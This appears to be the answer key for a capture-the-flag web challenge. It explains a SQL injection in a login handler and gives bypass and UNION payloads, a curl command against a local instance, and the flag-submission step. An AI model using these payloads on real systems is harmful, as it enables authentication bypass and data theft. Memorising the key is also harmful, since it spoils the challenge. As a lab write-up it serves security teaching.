# w01 Neon Login :: solution

## Root cause

`app/server.py`, `login()`:

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
row = db().execute(query).fetchone()
```

User input is interpolated straight into SQL. No parameterisation.

## Exploit

POST to `/login` with a username that closes the string and comments the rest:

```
username=admin' --
password=x
```

Query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'x'
```

`--` comments out the password check; the first row where `username='admin'`
is returned. Session role becomes `admin`, and the dashboard renders the
`secret` column, which holds the flag.

Equivalent payloads:

- `' OR 1=1 --` (returns the first row, usually admin)
- `' UNION SELECT 1,'x','x','admin',(SELECT secret FROM users WHERE role='admin') --`

## Flag

Flag is injected at runtime via `W0B_FLAG`; there is no static value to
hardcode. Retrieve it with the injection.

## Submit

```bash
curl -c /tmp/c -b /tmp/c -X POST http://localhost:30001/login \
  --data-urlencode "username=admin' --" \
  --data-urlencode "password=x" -L
```

Then read the flag from the dashboard response and submit it:

```bash
./manage.sh submit 'hex4b0t{...}' ai-pilot
```
